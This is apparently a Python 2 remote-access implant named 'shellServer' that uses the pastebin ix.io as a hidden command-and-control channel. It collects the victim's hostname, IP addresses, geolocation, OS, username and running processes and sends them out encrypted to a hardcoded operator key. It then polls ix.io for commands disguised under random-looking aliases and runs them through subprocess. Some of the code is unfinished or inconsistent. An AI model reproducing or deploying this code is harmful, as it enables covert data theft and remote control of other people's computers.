#!/usr/bin/python

from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Cipher import AES
import base64
import zlib
import hashlib
import random
import time
import json
import os
import socket
import platform
import pygeoip
from urllib2 import urlopen
import getpass
import psutil
import requests
import unicodedata
import re
import subprocess


class shellServer:

    def __init__(self):
        #get current working directory...
        self.cwd = str(os.getcwd())
        self.os = platform.system()
        self.fs = "/"
        if self.os == "Windows":
            self.fs = "\\"

        #shared secret
        self.messageSeparator = "abcde"

        #current instance information
        self.masterKey = None

        #instance ID
        self.idFile = self.cwd + self.fs + "id.txt"

        #geoip data
        self.geoipData = self.cwd + self.fs + "GeoLiteCity.dat"

        self.recipient = {
            "keyID": "ba7aca6cc99acc58b75996b872e5f79ebc8a9dbd708ee9c465a7db67",
            "key": """-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAs+KLbzD4LJ1ApK3hRorc
mYMLzi6GG2/Q2Y676tLBdSVfzKLqfz+W8mPWlrqL3iRfJD+YpYx+ecdHmEfkOxBI
LAGm0aq15geeU8px5wodfYXslru1ayndvjItgS7IaWMX1EqV+RWouiXjGexmgAUO
5wc5cdWevhZRRqOpQfbEINmz04lfLSnlnfoWKRo97NTgDSu19Xr4tMYf9NUN2FkP
/U0ZE1pM+BcAkhOok0rL80Djxyj+hNjT1snw+VsE60ESwVIvM4usWzjt34i4Tn3H
ZV9ZcYvpK93kWDw42dAGZJlxB9TkhpPfayR3iATO/0o6j1ZTuZmNpCC1LEnrR9Un
0EhCgF83v/9OKrkV1KdCp3X23GTLmxZcSBVaLdHWF0UtLsqgvDG6etznfeu5/lIB
FhOj/wisgD+XvZGbSj7QtZVvi+aM4x1Jp+mqXc+vM8r4FX6NaY0JggnHFnyTLf82
BcppCBsOWbfhYtVy4R96cGRvD+XEIWHpNHFG2QHNRU0EzXFpdPhlVLnYc2PJm4+v
fRyCJuZvdQfZnNgVel1XjExhiSfsUIBAet9FVpmHzn+Su2tD2e4e5xv3RggoMmB9
Cd00YfT/aurMLBUlCZ5ct9CqCBjg4F1IMk9Z3Hkljz5TFp7hV064BIWHrzt63gFe
5g6AYPpxgolrhwGJQCQVxecCAwEAAQ==
-----END PUBLIC KEY-----""",
            "hostname": None,
            "localIP": None,
            "ip": None,
            "location": None,
            "os": None,
            "username": None,
            "processes": None
            }

        #recipient files
        self.recipientKeyFile = None
        self.recipientIDFile = self.cwd + self.fs + "recipient.txt"

        self.info = {
            "keyID": self.getMyID(),
            "hostname": socket.gethostname(),
            "localIP": self.getLocalIP(),
            "IP": urlopen('http://ip.42.pl/raw').read(),
            "location": self.getIPLocation(urlopen('http://ip.42.pl/raw').read()),
            "os": str(platform.system()) + " " + str(platform.release()),
            "username": getpass.getuser(),
            "processes": self.getProcesses()
            }

        self.linkREGEX = re.compile(r"\<a\shref\=\"\/(?P<chars>[a-zA-Z0-9]*?)\/\"\>\[h\]\<\/a\>\s\s\s\s\s" + re.escape(self.info["keyID"]))

        #key config
        self.keysize = 4096
        self.privateKeyFile = self.cwd + self.fs + "priv.key"
        self.publicKeyDir = self.cwd + self.fs + "public_keys"
        self.publicKeyFile = self.publicKeyDir + self.fs + self.info["keyID"] + ".key"

        #actual keys
        self.privateKey = None
        self.publicKey = None

        #current recipient
        #self.recipient = {
            #"KeyID": "ba7aca6cc99acc58b75996b872e5f79ebc8a9dbd708ee9c465a7db67",
            #"Key": self.getKeyByID()
            #}

        #downloads folder
        self.downloadsFolder = self.cwd + self.fs + "Downloads"

        #logging
        self.logging = True
        self.logfile = self.cwd + self.fs + "log.txt"

        #links
        self.linksFile = self.cwd + self.fs + "links.txt"
        self.links = list()

        #AES Info
        self.aesBlockSize = 16
        self.padding = "{"
        self.secretKey = "$RFV%TGB^YHN&UJM"

        #registered
        self.registered = False

        self.keyExchangeAlias = "agdke123"
        self.cdAlias = "dhjsdn445"
        self.lsAlias = "jdkfakldskjla"
        self.execAlias = "90thker99999hjk"
        self.pwdAlias = "jkfs998908"
        self.getAlias = "bjksdi9043hkdn"
        self.putAlias = "nfdaouo89432bbbb42jhk8"

    def encodeAES(self, string):
        cipher = AES.new(self.secretKey)
        s = string + (self.aesBlockSize - len(string) % self.aesBlockSize) * self.padding
        return cipher.encrypt(s)

    def decodeAES(self, ciphertext):
        cipher = AES.new(self.secretKey)
        return cipher.decrypt(ciphertext).rstrip(self.padding)

    def getKeyByID(self, ID=None):
        if ID is None:
            keyfile = "./public_keys/" + str(self.recipient["KeyID"]) + ".key"
            if os.path.exists(keyfile):
                fo = open(keyfile, "r")
                self.recipient["Key"] = fo.readlines()
                return self.recipient["Key"]
            else:
                key = self.registerServer()
                return key
        else:
            keyfile = "./public_keys/" + str(ID) + ".key"
            if os.path.exists(keyfile):
                fo = open(keyfile, "r")
                self.recipient["Key"] = fo.readlines()
                return self.recipient["Key"]
            else:
                key = self.registerServer()
                return key

    def getProcesses(self):
        procs = list()
        for proc in psutil.process_iter():
            try:
                pinfo = proc.as_dict(attrs=['pid', 'name', 'username'])
            except psutil.NoSuchProcess:
                pass
            else:
                procs.append(pinfo)
        return procs

    def getLocalIP(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            # doesn't even have to be reachable
            s.connect(('10.255.255.255', 1))
            IP = s.getsockname()[0]
        except:
            IP = '127.0.0.1'
        finally:
            s.close()
        return IP

    def generateID(self):
        random.seed(time.time())
        myID = hashlib.sha224(str(random.random())).hexdigest()
        return myID

    def getIPLocation(self, IP):
        rawdata = pygeoip.GeoIP(self.geoipData)
        data = rawdata.record_by_name(IP)
        return data

    def getMyID(self):
        if os.path.exists(self.idFile):
            myID = self.load(self.idFile)
            return myID
        else:
            myID = self.generateID()
            self.save(myID, self.idFile)
            return myID

    def save(self, contents, filename):
        fo = open(filename, "w")
        fo.write(contents)
        fo.close()

    def append(self, contents, filename):
        fo = open(filename, "a")
        fo.write(contents)
        fo.close()

    def load(self, filename):
        str1 = ""
        fo = open(filename, "r")
        for Line in fo.readlines():
            str1 = str1 + str(Line)
        return str1

    def test(self):
        self.loadKeys()
        #print(self.privateKey.exportKey(format='PEM'))
        #print(self.publicKey.exportKey(format='PEM'))
        #print(self.info["IP"])
        #print(self.info["localIP"])
        #print(self.info["hostname"])
        #print(self.info["myID"])
        #print(self.info["location"])
        #print(self.info["os"])
        #print(self.info["username"])
        #print(self.info["processes"])
        #self.sendMessageToIXIO(str(self.info), attachment=None, toAddr=self.info["myID"], fromAddr=self.info["myID"], subject="test")
        self.getMessagesFromIXIO()

    def generateKey(self):
        self.privateKey = RSA.generate(self.keysize, e=65537)
        self.savePrivateKey()
        self.publicKey = self.privateKey.publickey()
        self.savePublicKey()

    def savePrivateKey(self):
        self.save(self.privateKey.exportKey(format='PEM'), self.privateKeyFile)

    def savePublicKey(self):
        if os.path.exists(self.publicKeyDir):
            self.save(self.publicKey.exportKey(format='PEM'), self.publicKeyFile)
        else:
            os.mkdir(self.publicKeyDir)
            self.save(self.publicKey.exportKey(format='PEM'), self.publicKeyFile)

    def loadKeys(self):
        try:
            self.privateKey = RSA.importKey(self.load(self.privateKeyFile))
            self.publicKey = RSA.importKey(self.load(self.publicKeyFile))
        except:
            self.generateKey()

    #def listRecipientsByName():

    def encrypt(self, keyID, plaintext):
        self.recipientKeyFile = self.publicKeyDir + "/" + keyID + ".key"
        key = RSA.importKey(self.load(self.recipientKeyFile))
        rsa_key = PKCS1_OAEP.new(key)

        blob = zlib.compress(plaintext)
        blocksize = 470
        offset = 0
        endloop = False
        encrypted = ""

        while not endloop:
            #The chunk
            block = blob[offset:offset + blocksize]

            #If the data chunk is less then the chunk size, then we need to add
            #padding with " ". This indicates the we reached the end of the file
            #so we end loop here
            if len(block) % blocksize != 0:
                endloop = True
                block += " " * (blocksize - len(block))

            #Append the encrypted chunk to the overall encrypted file
            encrypted += rsa_key.encrypt(block)

            #Increase the offset by chunk size
            offset += blocksize

        #Base 64 encode the encrypted file
        return base64.urlsafe_b64encode(str(encrypted))

    def decrypt(self, cyphertext):

        rsa_key = PKCS1_OAEP.new(self.privateKey)

        encrypted = base64.urlsafe_b64decode(str(cyphertext))
        print "decoded"
        print encrypted

        blocksize = 512
        offset = 0
        decrypted = ""

        while offset < len(encrypted):
            #The chunk
            block = encrypted[offset: offset + blocksize]

            #Append the decrypted chunk to the overall decrypted file
            decrypted += rsa_key.decrypt(block)

            #Increase the offset by chunk size
            offset += blocksize

        #return the decompressed decrypted data
        return zlib.decompress(decrypted)

    def saveLinks(self):
        f1 = open(self.linksFile, "w")
        f1.write(json.dumps(self.links))
        f1.close()

    def loadLinks(self):
        try:
            f1 = open(self.linksFile, "r")
            self.links = json.loads(f1.read())
            f1.close()
        except:
            self.log("cannot load links: does the links file exist?")

    def log(self, message):
        if self.logging is True:
            t = time.strftime("%m/%d/%Y %H:%M:%S")
            f = open(self.logfile, "a")
            f.write(str(t) + ": " + str(message) + "\n")
            print str(t) + ": " + str(message)
            f.close()
        else:
            t = time.strftime("%m/%d/%Y %H:%M:%S")
            print str(t) + ": " + str(message)

    def sendMessageToIXIO(self, message, attachment=None, toAddr="", fromAddr="", subject="test"):
        entry = dict()
        entry["subject"] = str(subject)
        entry["message"] = str(message)
        if fromAddr is not "":
            entry["fromAddr"] = str(fromAddr)
        else:
            entry["fromAddr"] = str(self.info["keyID"])
        entry["toAddr"] = str(toAddr)

        if attachment is not None:
            head, tail = os.path.split(str(attachment))
            entry["filename"] = tail
            with open(str(attachment)) as f1:
                entry["attachment"] = base64.urlsafe_b64encode(f1.read())
        else:
            entry["filename"] = None
            entry["attachment"] = None

        #turn entry into json
        entryJson = json.dumps(entry)
        self.log(entryJson)
        if toAddr is not "":
            cipherText = self.encrypt(toAddr, str(entryJson))
            #send entry to ix.io
            params = {"f:1": str(cipherText), "name:1": str(toAddr) + base64.urlsafe_b64encode(str(time.time())), "read:1": "1"}
            #if self.useragent == "":
                #self.setUserAgent()
            #user_agent = {'User-agent': self.useragent}
            #response = requests.post("http://ix.io", headers=user_agent, data=params)
            response = requests.post("http://ix.io", data=params)
            print(response.text)
        else:
            cipherText = str(self.encodeAES(entryJson)) + str(self.messageSeparator) + str(hashlib.sha256(str(time.time())).hexdigest())
            hash1 = hashlib.sha256(str(time.time())).hexdigest()
            params = {"f:1": base64.urlsafe_b64encode(str(cipherText)), "name:1": "all" + str(hash1), "read:1": "1"}
            #if self.useragent == "":
                #self.setUserAgent()
            #user_agent = {'User-agent': self.useragent}
            #response = requests.post("http://ix.io", headers=user_agent, data=params)
            response = requests.post("http://ix.io", data=params)
            print(response.text)

    def getMessagesFromIXIO(self):
        self.loadLinks()
        messageList = list()
        html = ""
        #get message from ix.io
        try:
            html = requests.get("http://ix.io/user/").text
            html = unicodedata.normalize('NFKD', html).encode('ascii', 'ignore')
        except:
            self.log("ix.io connection error")

        #self.log("ix.io source:")
        #self.log(html)

        matches = self.linkREGEX.finditer(str(html))
        print matches
        for m in matches:
            self.log("found a link...")
            if m is not None:
                chars = m.group("chars")
                link = "http://ix.io/" + str(chars)
                if link not in self.links:
                    if True:
                        self.log("link match: " + str(link))
                        self.links.append(link)
                        self.saveLinks()
                        cipherText = str(requests.get(link).text).split(self.messageSeparator)[0]

                        entryJson = self.decrypt(cipherText)
                        #dump json to dictionary
                        entry = json.loads(entryJson)
                        messageList.append(entry)
                    else:
                        self.log("shitty link")
                else:
                    self.log("link already visited")
        for message in messageList:
            print(message)
        return messageList

    def registerServer(self):
        msg = {
            "keyID": str(self.info["keyID"]),
            "key": str(self.load(self.publicKeyFile)),
            "hostname": str(self.info["hostname"]),
            "localIP": str(self.info["localIP"]),
            "IP": str(self.info["IP"]),
            "location": str(self.info["location"]),
            "os": str(self.info["os"]),
            "username": str(self.info["username"]),
            "processes": str(self.info["processes"])
        }

        self.sendMessageToIXIO(subject=self.keyExchangeAlias, message=str(json.dumps(msg)), toAddr=self.recipient["keyID"])

    def commandParser(self, ml):
        #print ml
        output = "blah"
        for message in ml:
            subject = message["subject"]
            if subject is self.lsAlias:
                cmd = "ls -sail"
                output = str(subprocess.check_output(cmd))
        return output

    def main(self):
        self.loadKeys()
        self.registerServer()
        messageList = self.getMessagesFromIXIO()
        output = self.commandParser(messageList)
        print output
        #self.sendMessageToIXIO(message="test", toAddr=self.recipient["keyID"])



s = shellServer()
s.main()

